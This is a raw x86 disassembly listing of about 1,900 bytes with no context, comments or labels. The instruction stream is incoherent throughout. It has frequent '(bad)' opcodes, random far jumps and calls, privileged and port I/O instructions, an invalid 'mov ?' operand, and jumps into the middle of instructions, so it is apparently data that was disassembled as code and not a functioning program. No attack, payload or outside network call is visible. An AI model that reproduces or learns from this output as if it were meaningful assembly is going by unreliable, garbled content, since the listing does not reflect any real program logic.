  50f55c:	lock inc esp
  50f55e:	adc    ebp,DWORD PTR [eax]
  50f560:	pop    eax
  50f561:	imul   esp,DWORD PTR [ecx-0x519139f4],0xffffff84
  50f568:	push   0xffffffab
  50f56a:	or     ebx,edi
  50f56c:	push   ds
  50f56d:	cmp    al,0xc3
  50f56f:	ins    BYTE PTR es:[edi],dx
  50f570:	xchg   ah,al
  50f572:	lahf   
  50f573:	mov    ecx,0xab0dd4d3
  50f578:	outs   dx,BYTE PTR ds:[esi]
  50f579:	ret    
  50f57a:	(bad)  
  50f57d:	addr16 jmp 0x50f540
  50f580:	mov    ah,0x0
  50f582:	pop    edi
  50f583:	cmp    al,0x75
  50f585:	jno    0x50f5c7
  50f587:	jmp    0xc1e8:0xcdbfd46c
  50f58e:	jne    0x50f585
  50f590:	xor    BYTE PTR [esi+ebx*8-0xe],ch
  50f594:	inc    edi
  50f595:	imul   ecx,DWORD PTR [ecx+eiz*4],0x4ce41275
  50f59c:	imul   ebx,edx,0x50e508de
  50f5a2:	(bad)  
  50f5a3:	dec    ecx
  50f5a4:	mov    ebp,0x3a997f28
  50f5a9:	cld    
  50f5aa:	pop    ss
  50f5ab:	mov    ecx,0x53a56910
  50f5b0:	(bad)  
  50f5b1:	adc    eax,0x4edddced
  50f5b6:	mov    edx,0xa21e8d7e
  50f5bb:	jnp    0x50f630
  50f5bd:	ins    BYTE PTR es:[edi],dx
  50f5be:	xchg   ecx,eax
  50f5bf:	das    
  50f5c0:	pop    es
  50f5c1:	sbb    ebp,DWORD PTR [ecx+ecx*1-0x17]
  50f5c5:	jb     0x50f5aa
  50f5c7:	push   0xffffffee
  50f5c9:	mov    dl,0x3d
  50f5cb:	fnsave [edi+0x23]
  50f5ce:	mov    ds:0x931c2ee3,eax
  50f5d3:	addr16 xchg ecx,eax
  50f5d5:	and    al,0x2
  50f5d7:	repz dec esi
  50f5d9:	mov    ds:0xaa3e8a43,eax
  50f5de:	cwde   
  50f5df:	xchg   ebx,eax
  50f5e0:	dec    esi
  50f5e1:	test   DWORD PTR [ecx-0x6b9b90],esi
  50f5e7:	stc    
  50f5e8:	mov    ds:0xbcd18c46,al
  50f5ed:	mov    bh,BYTE PTR ds:0xf9fab7e4
  50f5f3:	jmp    0x50f5e6
  50f5f5:	jae    0x50f62a
  50f5f7:	mov    dl,dh
  50f5f9:	mov    eax,ds:0x3364a344
  50f5fe:	or     al,0x88
  50f600:	in     al,0xcc
  50f602:	xchg   DWORD PTR ss:[ebx+0x72],esi
  50f606:	dec    ebx
  50f607:	jne    0x50f600
  50f609:	cmp    al,0x7a
  50f60b:	jns    0x50f5a9
  50f60d:	inc    esi
  50f60e:	and    bh,ch
  50f610:	idiv   ebp
  50f612:	adc    BYTE PTR [eax-0xb69ae59],bl
  50f618:	ret    
  50f619:	inc    edx
  50f61a:	in     al,0x54
  50f61c:	jecxz  0x50f69c
  50f61e:	ds xor eax,0x113d2db
  50f624:	mov    eax,ds:0x67d0650f
  50f629:	jmp    0xa7e4:0xdd9c8b2e
  50f630:	dec    edi
  50f631:	jge    0x50f685
  50f633:	xor    bl,bl
  50f635:	push   esp
  50f636:	mov    edx,0xeac08fbc
  50f63b:	cli    
  50f63c:	push   0x960b4cc2
  50f641:	out    dx,eax
  50f642:	mov    eax,0x571fa160
  50f647:	inc    ebp
  50f648:	jecxz  0x50f6c1
  50f64a:	fdivr  DWORD PTR ds:0x2e15a552
  50f650:	arpl   WORD PTR [eax],di
  50f652:	xor    al,0xb0
  50f654:	repz and edi,DWORD PTR [esi]
  50f657:	dec    edx
  50f658:	retf   
  50f659:	(bad)  
  50f65a:	(bad)  
  50f65b:	or     BYTE PTR [esi],al
  50f65d:	sar    DWORD PTR [ebp+ecx*1-0x31830029],1
  50f664:	rcr    ebx,0xf0
  50f667:	and    BYTE PTR [esi+ecx*1+0x1a2167ef],bl
  50f66e:	or     BYTE PTR [edi],dh
  50f670:	icebp  
  50f671:	or     al,0xc9
  50f673:	cdq    
  50f674:	add    al,BYTE PTR [ebp+0x28b73546]
  50f67a:	inc    ebp
  50f67b:	(bad)  
  50f67c:	loopne 0x50f66b
  50f67e:	add    al,0x2
  50f680:	out    dx,eax
  50f681:	je     0x50f60a
  50f683:	xchg   ecx,eax
  50f684:	out    0x33,al
  50f686:	mov    ch,0x9c
  50f688:	adc    esp,DWORD PTR [esi+0x58]
  50f68b:	jae    0x50f705
  50f68d:	jo     0x50f687
  50f68f:	sbb    DWORD PTR [ebp+0x71],ebx
  50f692:	jae    0x50f668
  50f694:	push   ebx
  50f695:	test   DWORD PTR [ecx],0x80b5ccfd
  50f69b:	xor    eax,DWORD PTR [esi+0x15cb0646]
  50f6a1:	popf   
  50f6a2:	sub    al,0x62
  50f6a4:	fsubr  st(7),st
  50f6a6:	das    
  50f6a7:	cs xchg ebp,eax
  50f6a9:	mov    ds:0xbda5381e,al
  50f6ae:	adc    dl,dl
  50f6b0:	pop    ss
  50f6b1:	test   al,0x1f
  50f6b3:	in     al,0xc8
  50f6b5:	cmp    ch,0xc1
  50f6b8:	into   
  50f6b9:	imul   ecx,edx,0x238ed31c
  50f6bf:	push   esp
  50f6c0:	xor    ecx,DWORD PTR [esi]
  50f6c2:	lock adc edi,DWORD PTR [ebx-0x53]
  50f6c6:	(bad)  
  50f6c8:	jle    0xac74e5d7
  50f6ce:	dec    esp
  50f6cf:	pop    esp
  50f6d0:	mov    al,BYTE PTR [esi-0x33]
  50f6d3:	add    edi,DWORD PTR [ebx+0x27]
  50f6d6:	ret    0x929e
  50f6d9:	push   cs
  50f6da:	sub    ecx,DWORD PTR ds:0x873f358a
  50f6e0:	jo     0x50f721
  50f6e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  50f6e3:	les    ebp,FWORD PTR [edi]
  50f6e5:	idiv   BYTE PTR [edi+0x21]
  50f6e8:	sbb    bl,BYTE PTR [edi+0x51]
  50f6eb:	push   ds
  50f6ec:	sbb    eax,0x13121194
  50f6f1:	fdiv   DWORD PTR ss:[eax-0x6b65e1a]
  50f6f8:	jge    0x50f6d9
  50f6fa:	jg     0x50f6ec
  50f6fc:	mov    esp,0xb2c690ed
  50f701:	mov    al,ds:0xac5831fc
  50f706:	jo     0x50f763
  50f708:	pop    edx
  50f709:	jmp    0x8e23:0xceb6b011
  50f710:	aaa    
  50f711:	getsec 
  50f713:	in     eax,0x46
  50f715:	dec    esp
  50f716:	shl    DWORD PTR [ebx+edi*4],1
  50f719:	popa   
  50f71a:	mov    edi,0x95006465
  50f71f:	das    
  50f720:	cmp    eax,0xa21f0afd
  50f725:	mov    al,0x62
  50f727:	or     DWORD PTR [ebx+eax*1+0x4bffc2c9],esi
  50f72e:	icebp  
  50f72f:	mov    edi,0x610ed59d
  50f734:	shl    BYTE PTR [esi+0x6858d5a6],1
  50f73a:	fstp   st(5)
  50f73c:	mov    bl,0xe3
  50f73e:	aaa    
  50f73f:	shl    dh,0x4c
  50f742:	test   al,0xfc
  50f744:	dec    edi
  50f745:	adc    al,0xe6
  50f747:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  50f748:	adc    eax,0x8c2a36ab
  50f74d:	add    BYTE PTR [esi+eax*8+0x203e2f64],ch
  50f754:	mov    ah,0x5a
  50f756:	mov    bh,BYTE PTR [esi]
  50f758:	mov    eax,ds:0xf4b4ac32
  50f75d:	inc    edi
  50f75e:	sub    esp,eax
  50f760:	and    eax,0x26bb900d
  50f765:	js     0x50f727
  50f767:	pushf  
  50f768:	add    BYTE PTR [edi-0x1df9719c],bh
  50f76e:	pandn  mm7,QWORD PTR [ebx+ebp*2+0x6c6454f0]
  50f776:	cmp    dh,al
  50f778:	ror    DWORD PTR ds:0x20b1dd7e,1
  50f77e:	jge    0x50f74e
  50f780:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  50f781:	pushf  
  50f782:	pop    ebx
  50f783:	mov    bl,0x6e
  50f785:	sub    al,0x8e
  50f787:	js     0x50f74c
  50f789:	icebp  
  50f78a:	outs   dx,DWORD PTR ds:[esi]
  50f78b:	stos   BYTE PTR es:[edi],al
  50f78c:	mov    edx,0x75c81904
  50f791:	dec    esi
  50f792:	fdivr  st,st(4)
  50f794:	or     DWORD PTR [ecx+0x16b8d552],ebx
  50f79a:	sahf   
  50f79b:	pop    edi
  50f79c:	push   ebp
  50f79d:	adc    BYTE PTR [eax],dl
  50f79f:	mov    BYTE PTR [ebx],dl
  50f7a1:	pop    ds
  50f7a2:	outs   dx,BYTE PTR ds:[esi]
  50f7a3:	test   al,0x26
  50f7a5:	fisubr DWORD PTR [edi]
  50f7a7:	lea    eax,[esi+0x44]
  50f7aa:	inc    esp
  50f7ab:	mov    bh,0x53
  50f7ae:	xchg   ecx,eax
  50f7af:	cmp    DWORD PTR [ecx+0x5b288f39],esi
  50f7b5:	ins    DWORD PTR es:[edi],dx
  50f7b6:	sub    BYTE PTR ds:0xbda86cdd,dl
  50f7bc:	bound  ebp,QWORD PTR [edx]
  50f7be:	into   
  50f7bf:	xchg   edx,eax
  50f7c0:	or     ecx,ecx
  50f7c2:	stos   BYTE PTR es:[edi],al
  50f7c3:	xor    BYTE PTR [ebx],cl
  50f7c5:	pop    eax
  50f7c6:	mov    eax,0xc593526b
  50f7cb:	or     al,0x7f
  50f7cd:	add    cl,ch
  50f7cf:	sub    al,0xa6
  50f7d1:	loope  0x50f826
  50f7d3:	test   dl,cl
  50f7d5:	andps  xmm7,xmm4
  50f7d8:	mov    esp,0xb1515bf5
  50f7dd:	mov    ebx,0xfc884e26
  50f7e2:	pop    edi
  50f7e3:	pop    edi
  50f7e4:	mov    esi,0x76e3061e
  50f7e9:	push   edi
  50f7ea:	not    cl
  50f7ec:	inc    ebp
  50f7ed:	in     al,dx
  50f7ee:	cld    
  50f7ef:	xchg   esp,eax
  50f7f0:	xor    al,BYTE PTR [edx+0x4bdaf284]
  50f7f6:	xchg   ebx,edx
  50f7f8:	fbld   TBYTE PTR [eax-0x512864ac]
  50f7fe:	ja     0x50f7b7
  50f800:	stos   DWORD PTR es:[edi],eax
  50f801:	sub    DWORD PTR [edi+0x654692e4],esi
  50f807:	xchg   ebp,eax
  50f808:	ffree  st(2)
  50f80a:	je     0x50f7b7
  50f80c:	fnstenv [esi+0x60]
  50f80f:	bound  ebp,QWORD PTR [edi]
  50f811:	pusha  
  50f812:	imul   ebx
  50f814:	in     al,dx
  50f815:	adc    esi,ebp
  50f817:	mov    ah,0x72
  50f819:	jge    0x50f7de
  50f81b:	fldenv [eax*2-0x3c1089e8]
  50f822:	push   eax
  50f823:	inc    ebx
  50f824:	ror    BYTE PTR [edi-0x56],1
  50f827:	iret   
  50f828:	loop   0x50f864
  50f82a:	cli    
  50f82b:	stc    
  50f82c:	outs   dx,BYTE PTR ds:[esi]
  50f82d:	lea    esp,[edx]
  50f82f:	or     DWORD PTR [esi+0x4efe8b03],ebp
  50f835:	popf   
  50f836:	sub    eax,0x3b50812c
  50f83b:	ins    BYTE PTR es:[edi],dx
  50f83c:	cs mov ebp,0xbb5724ad
  50f842:	mov    ds:0x187b1453,al
  50f847:	jmp    0xc6e6d599
  50f84c:	add    ebx,ecx
  50f84e:	jl     0x50f850
  50f850:	ja     0x50f836
  50f852:	jnp    0x50f828
  50f854:	xchg   BYTE PTR [ebx-0x7d],al
  50f857:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  50f858:	mov    al,0x64
  50f85a:	mov    ch,0x7b
  50f85c:	add    edi,eax
  50f85e:	adc    eax,0xf8776aa6
  50f863:	add    bh,BYTE PTR gs:[eax+0x6df31779]
  50f86a:	ss cmp eax,0x5b876d5a
  50f870:	test   edi,ebx
  50f872:	popa   
  50f873:	js     0x50f883
  50f875:	arpl   WORD PTR [ebp-0x35627e9c],bp
  50f87b:	call   0x2118e9f5
  50f880:	lods   al,BYTE PTR ds:[esi]
  50f881:	call   0x424cc7c3
  50f886:	pop    esp
  50f887:	inc    ecx
  50f888:	nop
  50f889:	jmp    0xdb54:0x3944e808
  50f890:	inc    ebx
  50f891:	sar    cl,0x95
  50f894:	dec    esp
  50f895:	xchg   BYTE PTR [ebp+edx*2+0x42],dh
  50f899:	stc    
  50f89a:	pop    ebx
  50f89b:	sub    esi,0xf75613de
  50f8a1:	sbb    BYTE PTR [ebx+0x17],al
  50f8a4:	imul   ebp,ecx,0x2ffe7ed1
  50f8aa:	iret   
  50f8ab:	aam    0xda
  50f8ad:	in     eax,0x4a
  50f8af:	mov    ebx,0xff08acf4
  50f8b4:	sub    DWORD PTR [edi],0x45a4213c
  50f8ba:	sub    ebp,DWORD PTR [esp+edi*1-0x34e3c807]
  50f8c1:	in     eax,0x68
  50f8c3:	stc    
  50f8c4:	je     0x50f91f
  50f8c6:	or     al,0xda
  50f8c8:	leave  
  50f8c9:	xchg   BYTE PTR [eax+ebp*8+0x53],dl
  50f8cd:	fiadd  WORD PTR [esi-0x31]
  50f8d0:	mov    dh,0xf4
  50f8d2:	scas   al,BYTE PTR es:[edi]
  50f8d3:	scas   al,BYTE PTR es:[edi]
  50f8d4:	mov    edi,0x5e7362f9
  50f8d9:	mov    ebx,0xcdd74a7d
  50f8de:	adc    eax,0x622d6c0d
  50f8e3:	punpcklbw mm0,DWORD PTR [esi]
  50f8e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  50f8e7:	mov    dl,0x6f
  50f8e9:	xor    al,0xb5
  50f8eb:	jg     0x50f8a0
  50f8ed:	mov    ebp,0x71940eb8
  50f8f2:	aas    
  50f8f3:	cdq    
  50f8f4:	or     al,0xc2
  50f8f6:	outs   dx,DWORD PTR ds:[esi]
  50f8f7:	and    eax,0x781a105a
  50f8fc:	jmp    0x4bdea01b
  50f901:	jmp    0xbb375eb9
  50f906:	push   ss
  50f907:	jno    0x50f8ad
  50f909:	cmp    eax,0x23b1ace8
  50f90e:	faddp  st(2),st
  50f910:	ret    0xdd92
  50f913:	out    0xba,eax
  50f915:	jmp    DWORD PTR [edx-0x7e]
  50f918:	retf   
  50f919:	enter  0x153a,0xa3
  50f91d:	xchg   edx,eax
  50f91e:	add    esp,ecx
  50f920:	and    al,0x97
  50f922:	jae    0x50f8a9
  50f924:	icebp  
  50f925:	outs   dx,DWORD PTR ds:[esi]
  50f926:	test   al,0x46
  50f929:	in     eax,dx
  50f92a:	cmp    eax,0x240b35a7
  50f92f:	mov    dl,0x1e
  50f931:	jecxz  0x50f942
  50f933:	pop    eax
  50f934:	scas   eax,DWORD PTR es:[edi]
  50f935:	rcr    DWORD PTR [edx],cl
  50f937:	test   DWORD PTR [ebx-0x9],0x16e5afca
  50f93e:	xlat   BYTE PTR ds:[ebx]
  50f93f:	sti    
  50f940:	sbb    dl,BYTE PTR [eax]
  50f942:	xchg   esi,eax
  50f943:	outs   dx,BYTE PTR ds:[esi]
  50f944:	inc    esp
  50f945:	cwde   
  50f946:	call   0xbe60:0x7e87e303
  50f94d:	sbb    esi,ebx
  50f94f:	fcmovu st,st(0)
  50f951:	ins    BYTE PTR es:[edi],dx
  50f952:	pop    ebp
  50f953:	sub    DWORD PTR [ebp-0x7115f2d1],0xffffffa4
  50f95a:	jmp    0xdc6a2f2a
  50f95f:	mov    edi,0x1ce9a8ed
  50f964:	sbb    eax,0x30081f9
  50f969:	fild   WORD PTR [eax+0x3b]
  50f96c:	sub    al,0x56
  50f96e:	(bad)  
  50f96f:	rol    BYTE PTR gs:[ebx],1
  50f972:	inc    ebx
  50f973:	mov    al,0xb7
  50f975:	pop    ebp
  50f976:	ret    0xfdf7
  50f979:	mov    dl,0x79
  50f97b:	scas   al,BYTE PTR es:[edi]
  50f97c:	sbb    dl,dh
  50f97e:	cmp    BYTE PTR [ebx-0xae7fe88],ah
  50f984:	xchg   DWORD PTR [ecx-0x9],ebx
  50f987:	lods   eax,DWORD PTR ds:[esi]
  50f988:	pushf  
  50f989:	xor    esp,0xffffffca
  50f98c:	mov    ch,0x3f
  50f98e:	pop    edi
  50f98f:	(bad)  
  50f990:	fcom   QWORD PTR [ecx]
  50f992:	adc    DWORD PTR [ebx],0xdeb09a11
  50f998:	xchg   si,sp
  50f99b:	mov    eax,fs:0xa204763d
  50f9a1:	inc    edi
  50f9a2:	dec    eax
  50f9a3:	cmp    al,0xcc
  50f9a5:	fadd   st,st(1)
  50f9a7:	jae    0x50fa18
  50f9a9:	xlat   BYTE PTR ds:[ebx]
  50f9aa:	mov    esi,0x561a84d9
  50f9af:	lods   al,BYTE PTR ds:[esi]
  50f9b0:	mov    ch,cl
  50f9b2:	push   0xfd9b3604
  50f9b7:	push   edi
  50f9b8:	or     BYTE PTR [ebp+0x41],dl
  50f9bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  50f9bc:	rcr    BYTE PTR ds:0xe609258,cl
  50f9c2:	bound  esi,QWORD PTR [ebx+edi*1+0x37d12731]
  50f9c9:	and    DWORD PTR [esi],0x2ec32c2f
  50f9cf:	lods   al,BYTE PTR ds:[esi]
  50f9d0:	cmovb  esi,DWORD PTR [si+0x9]
  50f9d5:	call   0x3940:0xf98b8d5
  50f9dc:	jb     0x50f9af
  50f9de:	loop   0x50f973
  50f9e0:	mov    ecx,0xc4cf76b2
  50f9e5:	popw   ss
  50f9e7:	lds    esp,FWORD PTR [ebx+0x2153dc54]
  50f9ed:	lds    esi,FWORD PTR [edi+0x7e]
  50f9f0:	adc    esp,DWORD PTR ds:0x2e3c57a
  50f9f6:	jnp    0x50fa5a
  50f9f8:	xchg   esp,eax
  50f9f9:	and    eax,0x99e85715
  50f9fe:	das    
  50f9ff:	inc    ebx
  50fa00:	mov    ecx,0xe2adeec5
  50fa05:	pop    ds
  50fa06:	repz fcomp DWORD PTR [esi]
  50fa09:	dec    esp
  50fa0a:	mov    ch,0x5a
  50fa0c:	imul   esi,DWORD PTR [ebx],0xffffffdd
  50fa0f:	and    ebx,ebp
  50fa11:	test   al,0x86
  50fa13:	ret    
  50fa14:	or     bl,BYTE PTR [ebx]
  50fa16:	nop
  50fa17:	or     BYTE PTR [esi],0xfa
  50fa1a:	xor    al,0x2d
  50fa1c:	clc    
  50fa1d:	push   0xffffff85
  50fa1f:	rol    DWORD PTR [esi-0x68],1
  50fa22:	pop    es
  50fa23:	mov    bl,0x1f
  50fa25:	scas   eax,DWORD PTR es:[edi]
  50fa26:	push   esp
  50fa27:	jne    0x50f9fa
  50fa29:	imul   ebp,DWORD PTR [ebx-0x4a7ed73b],0xc
  50fa30:	(bad)  
  50fa31:	cmp    DWORD PTR [ebp+0x6bfc08c5],esp
  50fa37:	jb     0x50fa05
  50fa39:	push   ds
  50fa3a:	pusha  
  50fa3b:	fs out dx,al
  50fa3d:	adc    BYTE PTR [edi+0xb],dh
  50fa40:	adc    cl,BYTE PTR [esi-0x34]
  50fa43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  50fa44:	out    dx,eax
  50fa45:	xchg   ebx,eax
  50fa46:	repnz jecxz 0x50f9f9
  50fa49:	ffree  st(7)
  50fa4b:	xor    BYTE PTR [esi+0x171b6d7a],0xee
  50fa52:	adc    al,0xe2
  50fa54:	xor    al,0xc1
  50fa56:	pop    ecx
  50fa57:	jbe    0x50fab8
  50fa59:	frstor [ebx]
  50fa5b:	and    edx,DWORD PTR [edx+0x2f71278c]
  50fa61:	es ins BYTE PTR es:[edi],dx
  50fa63:	shl    edx,0xca
  50fa66:	cmp    ebx,DWORD PTR [edi]
  50fa68:	scas   al,BYTE PTR es:[edi]
  50fa69:	fidiv  DWORD PTR [ecx]
  50fa6b:	clc    
  50fa6c:	rcr    DWORD PTR [eax+0x58cbef05],0x65
  50fa73:	adc    al,0xf0
  50fa75:	shr    DWORD PTR ds:0x36574d8f,cl
  50fa7b:	in     al,0xf4
  50fa7d:	stc    
  50fa7e:	fisttp WORD PTR [ecx]
  50fa80:	xchg   edi,eax
  50fa81:	(bad)  
  50fa82:	std    
  50fa83:	test   eax,0x60337190
  50fa88:	mov    ds,WORD PTR [esp+edi*1-0x1e862154]
  50fa8f:	mov    al,0x3b
  50fa91:	mov    al,ds:0x3752df9b
  50fa96:	jns    0x50fafe
  50fa98:	pop    ss
  50fa99:	bound  esi,QWORD PTR [ebx+0x46]
  50fa9c:	xlat   BYTE PTR ds:[ebx]
  50fa9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  50fa9e:	rcr    BYTE PTR ds:0xfab39cc5,0x91
  50faa5:	xor    eax,0xf7140f87
  50faaa:	mov    cl,0x6d
  50faac:	or     BYTE PTR [ebx-0x38],bl
  50faaf:	sbb    eax,0xeedf34f8
  50fab4:	pop    es
  50fab5:	sub    al,0x8c
  50fab7:	sbb    al,0x68
  50fab9:	push   eax
  50faba:	(bad)  
  50fabb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  50fabc:	(bad)  
  50fabd:	push   ds
  50fabe:	int    0x6c
  50fac0:	xchg   edx,eax
  50fac1:	lock enter 0x65b7,0x4f
  50fac6:	scas   eax,DWORD PTR es:[edi]
  50fac7:	nop
  50fac8:	push   ecx
  50fac9:	adc    al,0x6e
  50facb:	shl    DWORD PTR [edi+0xe67a733],cl
  50fad1:	nop
  50fad2:	scas   eax,DWORD PTR es:[edi]
  50fad3:	inc    ecx
  50fad4:	jb     0x50fb26
  50fad6:	inc    esi
  50fad7:	push   es
  50fad8:	call   0xdb94:0x3e7ade34
  50fadf:	repz pop eax
  50fae1:	cdq    
  50fae2:	mov    esp,0x14f6a64e
  50fae7:	push   cs
  50fae8:	xchg   ebp,eax
  50fae9:	outs   dx,BYTE PTR ds:[esi]
  50faea:	or     DWORD PTR [edi+0x2357c940],ecx
  50faf0:	out    0x50,al
  50faf2:	iret   
  50faf3:	xchg   ebp,eax
  50faf4:	mov    ebx,0xd94cc2f4
  50faf9:	xor    dh,bl
  50fafb:	push   eax
  50fafc:	fcomp  DWORD PTR [eax]
  50fafe:	jg     0x50faf0
  50fb00:	div    DWORD PTR [ecx+0x4d4fb462]
  50fb06:	push   edi
  50fb07:	popf   
  50fb08:	pop    ecx
  50fb09:	mov    ?,WORD PTR [ecx-0x50c5f211]
  50fb0f:	aad    0x8d
  50fb11:	je     0x50fb2d
  50fb13:	int3   
  50fb14:	outs   dx,DWORD PTR ds:[esi]
  50fb15:	loope  0x50fadf
  50fb17:	mov    ecx,0x31fa3912
  50fb1c:	sub    al,bl
  50fb1e:	dec    ecx
  50fb1f:	or     BYTE PTR [ecx-0x27],ah
  50fb22:	or     DWORD PTR [esi+0x1fa7b94b],0xffffffda
  50fb29:	jbe    0x50fb8b
  50fb2b:	mov    bl,BYTE PTR [edi+0x59]
  50fb2e:	mov    edx,DWORD PTR [ebp+ecx*1+0x9]
  50fb32:	scas   eax,DWORD PTR es:[edi]
  50fb33:	(bad)  
  50fb34:	mov    es,ebp
  50fb36:	push   ebp
  50fb37:	call   0x7f5:0x8436f9e7
  50fb3e:	and    al,0x32
  50fb40:	and    bl,BYTE PTR [edi+0x66]
  50fb43:	add    eax,0xf7e72c6d
  50fb48:	ins    DWORD PTR es:[edi],dx
  50fb49:	xchg   ebx,eax
  50fb4a:	adc    eax,esi
  50fb4c:	xchg   edi,eax
  50fb4d:	dec    DWORD PTR [ebx+ebx*8-0x59]
  50fb51:	call   0xc535983d
  50fb56:	std    
  50fb57:	xor    al,BYTE PTR [ebx-0x28d40b5]
  50fb5d:	dec    edx
  50fb5e:	call   0xae72d143
  50fb63:	add    al,0x1
  50fb65:	push   edx
  50fb66:	pop    ss
  50fb67:	pop    ds
  50fb68:	push   eax
  50fb69:	ja     0x50faec
  50fb6b:	lds    esi,FWORD PTR [ebx]
  50fb6d:	nop
  50fb6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  50fb6f:	xor    al,0x3
  50fb71:	dec    esp
  50fb72:	or     edi,DWORD PTR [ebx-0x6f]
  50fb75:	stos   DWORD PTR es:[edi],eax
  50fb76:	xchg   esp,eax
  50fb77:	out    0xb5,eax
  50fb79:	jae    0x50fb36
  50fb7b:	aad    0xf6
  50fb7d:	push   ds
  50fb7e:	jp     0x50fb96
  50fb80:	xchg   DWORD PTR [edi-0x58],esp
  50fb83:	arpl   WORD PTR [edx+0x5782c74d],bx
  50fb89:	test   eax,0xacfcdc54
  50fb8e:	shr    DWORD PTR es:[esi-0x3dfc5f64],cl
  50fb95:	pop    ds
  50fb96:	aam    0xcd
  50fb98:	aas    
  50fb99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  50fb9a:	cli    
  50fb9b:	pop    esi
  50fb9c:	out    dx,al
  50fb9d:	pushf  
  50fb9e:	inc    edx
  50fb9f:	cld    
  50fba0:	shr    BYTE PTR [edi-0x29],cl
  50fba3:	es jge 0x50fc01
  50fba6:	or     eax,0xd2a86b9b
  50fbab:	jg     0x50fb84
  50fbad:	fiadd  DWORD PTR [edx+0x52e6be08]
  50fbb3:	(bad)  
  50fbb4:	mov    dh,0x9c
  50fbb6:	fwait
  50fbb7:	jge    0x50fb56
  50fbb9:	xor    cl,BYTE PTR [esi-0x32]
  50fbbc:	out    dx,eax
  50fbbd:	sbb    ah,dl
  50fbbf:	fsubr  DWORD PTR [edx*4+0x7c5f1a57]
  50fbc6:	popf   
  50fbc7:	push   ss
  50fbc8:	scas   al,BYTE PTR es:[edi]
  50fbc9:	stos   DWORD PTR es:[edi],eax
  50fbca:	xchg   ebp,eax
  50fbcb:	and    ch,bh
  50fbcd:	rcr    BYTE PTR [ecx+0x176adfe5],1
  50fbd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  50fbd4:	sub    bl,BYTE PTR [ecx]
  50fbd6:	fistp  WORD PTR [edx-0x62cb00eb]
  50fbdc:	fs adc al,0xc2
  50fbdf:	cld    
  50fbe0:	jnp    0x50fbf0
  50fbe2:	mov    ah,BYTE PTR [ecx-0x6273e354]
  50fbe8:	inc    ebp
  50fbe9:	sti    
  50fbea:	loopne 0x50fc3a
  50fbec:	rcl    BYTE PTR [edi+edx*8+0x46109072],0xbf
  50fbf4:	xchg   BYTE PTR [edi],ah
  50fbf6:	dec    eax
  50fbf7:	pavgb  mm3,QWORD PTR [esi+0x7560726b]
  50fbfe:	call   0x97f2:0xd6bf253
  50fc05:	inc    edi
  50fc06:	rcr    edx,cl
  50fc08:	inc    edx
  50fc09:	pushf  
  50fc0a:	mov    al,0x74
  50fc0c:	fld    QWORD PTR [ebx+0x45]
  50fc0f:	test   DWORD PTR [edx+0x7cae12c4],ecx
  50fc15:	into   
  50fc16:	inc    esi
  50fc17:	ror    DWORD PTR [edi+0x3a613443],1
  50fc1d:	xchg   esi,eax
  50fc1e:	mov    BYTE PTR [ebx],dl
  50fc20:	out    dx,eax
  50fc21:	sub    ebx,ebx
  50fc23:	arpl   WORD PTR [edx+0x2c80122c],bx
  50fc29:	cmp    eax,0xb4c0d8ad
  50fc2e:	std    
  50fc2f:	jbe    0x50fcab
  50fc31:	mov    eax,ds:0x99491a1c
  50fc36:	xor    al,BYTE PTR [eax+edx*2-0x446dd573]
  50fc3d:	inc    eax
  50fc3e:	or     ah,bl
  50fc40:	loop   0x50fc85
  50fc42:	mov    al,0x48
  50fc44:	sbb    esi,DWORD PTR [ebx+ebx*2]
  50fc47:	aas    
  50fc48:	sahf   
  50fc49:	sbb    eax,ebp
  50fc4b:	lods   eax,DWORD PTR ds:[esi]
  50fc4c:	push   edx
  50fc4d:	jae    0x50fc18
  50fc4f:	ficomp DWORD PTR [edi+esi*4+0x63]
  50fc53:	imul   esp,DWORD PTR [edi-0x5d],0xfffffffc
  50fc57:	lahf   
  50fc58:	stc    
  50fc59:	xor    al,0xe6
  50fc5b:	stos   BYTE PTR es:[edi],al
  50fc5c:	and    BYTE PTR [edx+eax*8],bl
  50fc5f:	pop    ds
  50fc60:	mov    cl,0x1
  50fc62:	cmp    BYTE PTR [edi],ch
  50fc64:	mov    esi,0x21c9cb78
  50fc69:	push   edx
  50fc6a:	lods   al,BYTE PTR ds:[esi]
  50fc6b:	mov    edi,DWORD PTR [edi+0x2a]
  50fc6e:	or     al,0xa4
  50fc70:	push   eax
  50fc71:	xchg   edx,eax
  50fc72:	loope  0x50fbfd
  50fc74:	icebp  
  50fc75:	sbb    al,0xa9
  50fc77:	dec    edx
  50fc78:	add    ebx,ebx
  50fc7a:	repz inc ebx
  50fc7c:	pop    ss
  50fc7d:	push   esi
  50fc7e:	xchg   esi,eax
  50fc7f:	gs mov ebp,0x21d743e
  50fc85:	test   eax,0x4b1ebb3e
  50fc8a:	jge    0x50fc3a
  50fc8c:	mov    bl,0xb7
  50fc8e:	stos   DWORD PTR es:[edi],eax
  50fc8f:	jmp    0x898c:0x864d3e0
  50fc96:	test   BYTE PTR [esi],dl
  50fc98:	sbb    dl,bl
  50fc9a:	inc    edi
  50fc9b:	inc    ebx
  50fc9c:	xchg   BYTE PTR [ebp+0x7e],al
  50fc9f:	jmp    0x468ffa3e
  50fca4:	repz inc ebx
  50fca6:	popf   
  50fca7:	into   
  50fca8:	aad    0x9a
  50fcaa:	or     DWORD PTR [eax-0xc5a1a8],0xffffffa7
  50fcb1:	cdq    
  50fcb2:	push   esi
  50fcb3:	in     al,0x29
  50fcb5:	adc    al,0xd5
  50fcb7:	int    0x8d
  50fcb9:	iret   
  50fcba:	jecxz  0x50fd1c
  50fcbc:	inc    ecx
  50fcbd:	rcr    BYTE PTR [esi-0x27737a1a],cl
  50fcc3:	inc    ebx
  50fcc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  50fcc5:	imul   ebp,DWORD PTR [eax+0x1dd61c07],0xffffffa3
  50fccc:	sbb    bh,BYTE PTR [edx+0x10]
  50fccf:	pusha  
  50fcd0:	(bad)  
